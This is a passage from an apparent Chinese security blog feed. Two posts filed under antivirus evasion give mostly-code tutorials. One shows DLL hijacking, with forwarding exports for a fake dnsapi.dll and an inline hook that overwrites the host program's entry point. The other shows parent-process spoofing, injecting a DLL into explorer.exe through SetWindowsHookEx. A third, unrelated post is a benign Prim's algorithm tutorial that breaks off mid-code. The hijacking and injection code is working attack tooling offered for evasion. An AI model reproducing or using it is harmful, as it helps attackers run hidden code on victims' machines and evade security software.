class="comment">#pragma comment(linker,&quot;/EXPORT:ExtraInfo_Init=c:\windows\system32\dnsapi.ExtraInfo_Init&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Faz_AreServerListsInSameNameSpace=c:\windows\system32\dnsapi.Faz_AreServerListsInSameNameSpace&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:FlushDnsPolicyUnreachableStatus=c:\windows\system32\dnsapi.FlushDnsPolicyUnreachableStatus&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:GetCurrentTimeInSeconds=c:\windows\system32\dnsapi.GetCurrentTimeInSeconds&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:HostsFile_Close=c:\windows\system32\dnsapi.HostsFile_Close&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:HostsFile_Open=c:\windows\system32\dnsapi.HostsFile_Open&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:HostsFile_ReadLine=c:\windows\system32\dnsapi.HostsFile_ReadLine&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:IpHelp_IsAddrOnLink=c:\windows\system32\dnsapi.IpHelp_IsAddrOnLink&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Local_GetRecordsForLocalName=c:\windows\system32\dnsapi.Local_GetRecordsForLocalName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Local_GetRecordsForLocalNameEx=c:\windows\system32\dnsapi.Local_GetRecordsForLocalNameEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_Build=c:\windows\system32\dnsapi.NetInfo_Build&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_Clean=c:\windows\system32\dnsapi.NetInfo_Clean&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_Copy=c:\windows\system32\dnsapi.NetInfo_Copy&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_Free=c:\windows\system32\dnsapi.NetInfo_Free&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_GetAdapterByAddress=c:\windows\system32\dnsapi.NetInfo_GetAdapterByAddress&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_GetAdapterByInterfaceIndex=c:\windows\system32\dnsapi.NetInfo_GetAdapterByInterfaceIndex&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_GetAdapterByName=c:\windows\system32\dnsapi.NetInfo_GetAdapterByName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_IsAddrConfig=c:\windows\system32\dnsapi.NetInfo_IsAddrConfig&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_IsForUpdate=c:\windows\system32\dnsapi.NetInfo_IsForUpdate&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_ResetServerPriorities=c:\windows\system32\dnsapi.NetInfo_ResetServerPriorities&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:NetInfo_UpdateServerReachability=c:\windows\system32\dnsapi.NetInfo_UpdateServerReachability&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:QueryDirectEx=c:\windows\system32\dnsapi.QueryDirectEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Query_Main=c:\windows\system32\dnsapi.Query_Main&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Reg_FreeUpdateInfo=c:\windows\system32\dnsapi.Reg_FreeUpdateInfo&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Reg_GetValueEx=c:\windows\system32\dnsapi.Reg_GetValueEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Reg_ReadGlobalsEx=c:\windows\system32\dnsapi.Reg_ReadGlobalsEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Reg_ReadUpdateInfo=c:\windows\system32\dnsapi.Reg_ReadUpdateInfo&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Security_ContextListTimeout=c:\windows\system32\dnsapi.Security_ContextListTimeout&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Send_AndRecvUdpWithParam=c:\windows\system32\dnsapi.Send_AndRecvUdpWithParam&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Send_MessagePrivate=c:\windows\system32\dnsapi.Send_MessagePrivate&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Send_OpenTcpConnectionAndSend=c:\windows\system32\dnsapi.Send_OpenTcpConnectionAndSend&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_CacheCleanup=c:\windows\system32\dnsapi.Socket_CacheCleanup&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_CacheInit=c:\windows\system32\dnsapi.Socket_CacheInit&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_CleanupWinsock=c:\windows\system32\dnsapi.Socket_CleanupWinsock&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_ClearMessageSockets=c:\windows\system32\dnsapi.Socket_ClearMessageSockets&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_CloseEx=c:\windows\system32\dnsapi.Socket_CloseEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_CloseMessageSockets=c:\windows\system32\dnsapi.Socket_CloseMessageSockets&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_Create=c:\windows\system32\dnsapi.Socket_Create&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_CreateMulticast=c:\windows\system32\dnsapi.Socket_CreateMulticast&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_InitWinsock=c:\windows\system32\dnsapi.Socket_InitWinsock&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_JoinMulticast=c:\windows\system32\dnsapi.Socket_JoinMulticast&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_RecvFrom=c:\windows\system32\dnsapi.Socket_RecvFrom&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_SetMulticastInterface=c:\windows\system32\dnsapi.Socket_SetMulticastInterface&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_SetMulticastLoopBack=c:\windows\system32\dnsapi.Socket_SetMulticastLoopBack&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_SetTtl=c:\windows\system32\dnsapi.Socket_SetTtl&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Socket_TcpListen=c:\windows\system32\dnsapi.Socket_TcpListen&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Trace_Reset=c:\windows\system32\dnsapi.Trace_Reset&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Update_ReplaceAddressRecordsW=c:\windows\system32\dnsapi.Update_ReplaceAddressRecordsW&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Util_IsIp6Running=c:\windows\system32\dnsapi.Util_IsIp6Running&quot;)</span></span><br></pre></td></tr></table></figure><p>(注意后面dnsapi.xxxx不要写成dnsapi.dll.xxxx，这样的话在xp,和win7上是无法运行的)</p><p>接着我们按照2的方法，写一段inline hook 到OEP处，这样就能执行我们的代码了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">class HookExe&#123;</span><br><span class="line">private:</span><br><span class="line">typedef struct _PEB_LDR_DATA</span><br><span class="line">&#123;</span><br><span class="line">ULONG Length;</span><br><span class="line">BOOLEAN Initialized;</span><br><span class="line">PVOID SsHandle;</span><br><span class="line">LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line"></span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA; // +0x24</span><br><span class="line"></span><br><span class="line">typedef struct _UNICODE_STRING &#123;</span><br><span class="line">USHORT  Length;     //UNICODE占用的内存字节数，个数*2；</span><br><span class="line">USHORT  MaximumLength;</span><br><span class="line">PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">LIST_ENTRY InLoadOrderLinks;//加载顺序</span><br><span class="line">LIST_ENTRY InMemoryOrderLinks;//内存顺序</span><br><span class="line">LIST_ENTRY InInitializationOrderLinks;//初始化顺序</span><br><span class="line"></span><br><span class="line">PVOID DllBase;</span><br><span class="line">PVOID EntryPoint;</span><br><span class="line">ULONG SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">//后面不用就不写了</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line">static PVOID GetModuleEntry(WCHAR* ModuleName)&#123;</span><br><span class="line">PEB_LDR_DATA* ldr = 0;</span><br><span class="line">LIST_ENTRY* pIt = 0;</span><br><span class="line">LDR_DATA_TABLE_ENTRY*pTableEntry = 0;</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs:[0x30]</span><br><span class="line">add eax, 0xc</span><br><span class="line">mov eax, [eax]</span><br><span class="line">mov[ldr], eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (pIt = ldr-&gt;InMemoryOrderModuleList.Flink; pIt != &amp;ldr-&gt;InMemoryOrderModuleList; pIt = pIt-&gt;Flink)</span><br><span class="line">&#123;</span><br><span class="line">pTableEntry = (LDR_DATA_TABLE_ENTRY*)((char*)pIt - 8);</span><br><span class="line">WCHAR*BaseName = pTableEntry-&gt;BaseDllName.Buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!lstrcmpiW(BaseName, ModuleName))&#123;</span><br><span class="line"><span class="built_in">return</span> pTableEntry-&gt;EntryPoint;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void <span class="function"><span class="title">InstallInlineHook</span></span>()&#123;</span><br><span class="line">HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">HMODULE hInstance = GetModuleHandle(0);</span><br><span class="line">TCHAR szFileFullName[MAX_PATH], *pModuleName;</span><br><span class="line">DWORD entry = NULL;</span><br><span class="line"></span><br><span class="line">//get module name...</span><br><span class="line">GetModuleFileName(hInstance, szFileFullName, MAX_PATH);</span><br><span class="line">pModuleName = szFileFullName + lstrlen(szFileFullName) - 1;</span><br><span class="line"><span class="keyword">while</span> (*pModuleName != <span class="string">&#x27;\\&#x27;</span>)&#123;</span><br><span class="line">--pModuleName;</span><br><span class="line">&#125;</span><br><span class="line">++pModuleName;</span><br><span class="line">//get module entry..</span><br><span class="line">entry = (DWORD)GetModuleEntry(pModuleName);</span><br><span class="line"><span class="keyword">if</span> (entry)&#123;</span><br><span class="line">char code[256] = <span class="string">&quot;\xe9&quot;</span>;//jmp</span><br><span class="line">DWORD dwOffset = (((DWORD)MyCodeEntry) - (entry + 5));</span><br><span class="line">DWORD dwWriteBytes = 0;</span><br><span class="line">*(DWORD*)&amp;code[1] = dwOffset;</span><br><span class="line">WriteProcessMemory(hProcess, (void*)entry, code, 6, &amp;dwWriteBytes);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="function"><span class="title">HookExe</span></span>()&#123;</span><br><span class="line">InstallInlineHook();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">HookExe hook;</span><br></pre></td></tr></table></figure><p>这样Dll 被加载的时候，会先构造全局对象，在写完inline hook之后，才会从主程序的入口点开始执行，而现在入口处的代码已经被我们改成了一段跳转指令，接下来就会去执行我们的代码了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Dll-劫持&quot;&gt;&lt;a href=&quot;#Dll-劫持&quot; class=&quot;headerlink&quot; title=&quot;Dll 劫持&quot;&gt;&lt;/a&gt;Dll 劫持&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;最普通的就是找到依赖的第三方的Dll ，伪造好Dll,导出相同的函数，只不过现在导出的函数</summary>
      
    
    
    
    <category term="免杀技术" scheme="https://h4ckf0rfun.github.io/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>父进程欺骗</title>
    <link href="https://h4ckf0rfun.github.io/2023/01/05/%E7%88%B6%E8%BF%9B%E7%A8%8B%E6%AC%BA%E9%AA%97/"/>
    <id>https://h4ckf0rfun.github.io/2023/01/05/%E7%88%B6%E8%BF%9B%E7%A8%8B%E6%AC%BA%E9%AA%97/</id>
    <published>2023-01-05T06:55:43.000Z</published>
    <updated>2023-01-05T06:56:28.794Z</updated>
    
    <content type="html"><![CDATA[<h1 id="父进程欺骗"><a href="#父进程欺骗" class="headerlink" title="父进程欺骗"></a>父进程欺骗</h1><ol><li>利用 SetWindowsHookEx 实现.</li></ol><p>利用 SetWindowsHookEx 可以把一个Dll 强制注入到 其他进程中。然后在其他进程的上下文中执行某些代码。</p><p>因此可以利用 SetWindowsHookEx 将Dll注入到explorer.exe 中，然后在explorer中调用CreateProcess来创建进程。这样就和用户用鼠标点击的效果是一样的了。</p><p>代码:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">static void <span class="function"><span class="title">hookProc</span></span>() &#123;</span><br><span class="line">TCHAR szFileName[MAX_PATH];</span><br><span class="line">HMODULE hModule = GetModuleHandle(NULL);</span><br><span class="line"></span><br><span class="line">GetModuleFileName(hModule, szFileName,MAX_PATH);</span><br><span class="line"></span><br><span class="line">TCHAR* pFileName = szFileName + lstrlen(szFileName) - 1;</span><br><span class="line"><span class="keyword">while</span> (pFileName &gt;= szFileName &amp;&amp; <span class="string">&#x27;\\&#x27;</span> != *pFileName) &#123;</span><br><span class="line">--pFileName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pFileName &gt;= szFileName) &#123;</span><br><span class="line">++pFileName;</span><br><span class="line">TCHAR explorer[] = TEXT(<span class="string">&quot;explorer.exe&quot;</span>);</span><br><span class="line">static BOOL RunOnce = 0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!lstrcmpi(explorer, pFileName)  &amp;&amp; !RunOnce) &#123;</span><br><span class="line">RunOnce = TRUE;</span><br><span class="line">/*Add your code to here*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK GetMsgProc(</span><br><span class="line">int code,       // hook code</span><br><span class="line">WPARAM wParam,  // removal option</span><br><span class="line">LPARAM lParam   // message</span><br><span class="line">) &#123;</span><br><span class="line">hookProc();</span><br><span class="line"><span class="built_in">return</span> CallNextHookEx(NULL, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HHOOK g_hook = NULL;</span><br><span class="line"></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> __declspec(dllexport)</span><br><span class="line">BOOL <span class="function"><span class="title">InstallHook</span></span>() &#123;</span><br><span class="line">g_hook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc,</span><br><span class="line">GetModuleHandle(TEXT(<span class="string">&quot;InjectDll&quot;</span>)), NULL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (g_hook == NULL) &#123;</span><br><span class="line">TCHAR szError[0x100];</span><br><span class="line">wsprintf(szError, TEXT(<span class="string">&quot;SetWindowsHookEx Failed With Error :%d &quot;</span>), GetLastError());</span><br><span class="line">MessageBox(NULL, szError, TEXT(<span class="string">&quot;&quot;</span>), MB_OK);</span><br><span class="line"><span class="built_in">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> __declspec(dllexport)</span><br><span class="line">BOOL <span class="function"><span class="title">UninstallHook</span></span>() &#123;</span><br><span class="line"><span class="keyword">if</span> (g_hook) &#123;</span><br><span class="line"><span class="keyword">if</span> (UnhookWindowsHookEx(g_hook)) &#123;</span><br><span class="line">g_hook = 0;</span><br><span class="line"><span class="built_in">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;父进程欺骗&quot;&gt;&lt;a href=&quot;#父进程欺骗&quot; class=&quot;headerlink&quot; title=&quot;父进程欺骗&quot;&gt;&lt;/a&gt;父进程欺骗&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;利用 SetWindowsHookEx 实现.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用 SetWindowsH</summary>
      
    
    
    
    <category term="免杀技术" scheme="https://h4ckf0rfun.github.io/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>图-最小生成树</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</id>
    <published>2022-11-19T18:42:45.000Z</published>
    <updated>2022-11-19T18:51:43.353Z</updated>
    
    <content type="html"><![CDATA[<h1 id="图-最小生成树"><a href="#图-最小生成树" class="headerlink" title="图-最小生成树"></a>图-最小生成树</h1><h1 id="概念"><a href="#概念" class="headerlink" title="概念:"></a>概念:</h1><p>树是一类特殊的无向图。树中不能有回路。树必须是连同图。n个点有n-1条边。</p><p>生成树:：图中包含的一颗树。要求包含所有的节点，保留一部分边。生成树并不唯一。</p><p>最小生成树：所有生成树中所有边的权重和最小的生成树。</p><h1 id="寻找最小生成树"><a href="#寻找最小生成树" class="headerlink" title="寻找最小生成树:"></a>寻找最小生成树:</h1><h2 id="1-Prim‘s-Algorithm"><a href="#1-Prim‘s-Algorithm" class="headerlink" title="1.Prim‘s Algorithm"></a>1.Prim‘s Algorithm</h2><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程:"></a>算法流程:</h3><ol><li>初始时，任选一个节点作为一棵树 T</li><li>寻找图中 与 T相连的节点，选取这些节点中与T之间权值最小的那个节点加入到T中</li><li>重复步骤2，直到T包含图中所有的节点。</li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现:"></a>代码实现:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::priority_queue;</span><br><span class="line"><span class="keyword">using</span> std::pair;</span><br><span class="line"><span class="keyword">using</span> std::set;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> std::list;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line"><span class="type">int</span> vertex[<span class="number">2</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;Edge&gt; <span class="title">Prim</span><span class="params">(<span class="type">const</span> vector&lt;list&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; &amp;G,<span class="type">int</span> vertexs)</span></span>&#123;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; vertex_in_tree;</span><br><span class="line">vector&lt;Edge&gt; ret;</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (vertex_in_tree.<span class="built_in">size</span>() &lt; vertexs)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//去找出与当前树的距离最短的那个节点.</span></span><br><span class="line">Edge t;</span><br><span class="line">t.weight = UINT_MAX;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;vertex : vertex_in_tree)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;neighbor : G[vertex])&#123;</span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(neighbor.first) == vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line"><span class="keyword">if</span> (neighbor.second &lt; t.weight)&#123;</span><br><span class="line">t.vertex[<span class="number">0</span>] = vertex;</span><br><span class="line">t.vertex[<span class="number">1</span>] = neighbor.first;</span><br><span class="line">t.weight = neighbor.second;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//found.....</span></span><br><span class="line"><span class="built_in">assert</span>(t.weight != UINT_MAX);</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(t.vertex[<span class="number">1</span>]);<span class="comment">//1是新找到的节点.</span></span><br><span class="line">ret.<span class="built_in">push_back</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> edges, vertexs;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;edges, &amp;vertexs);</span><br><span class="line">vector&lt;list&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; G;</span><br><span class="line">G.<span class="built_in">resize</span>(vertexs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//input graph...</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; edges; i++)&#123;</span><br><span class="line"><span class="type">int</span> x, y, z;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;z);</span><br><span class="line">G[y - <span class="number">1</span>].<span class="built_in">push_back</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(z - <span class="number">1</span>, x));</span><br><span class="line">G[z - <span class="number">1</span>].<span class="built_in">push_back</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(y - <span class="number">1</span>, x));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> g = <span class="built_in">Prim</span>(G, vertexs);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;vertex : g)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, vertex.weight,vertex.vertex[<span class="number">0</span>] + <span class="number">1</span>,vertex.vertex[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 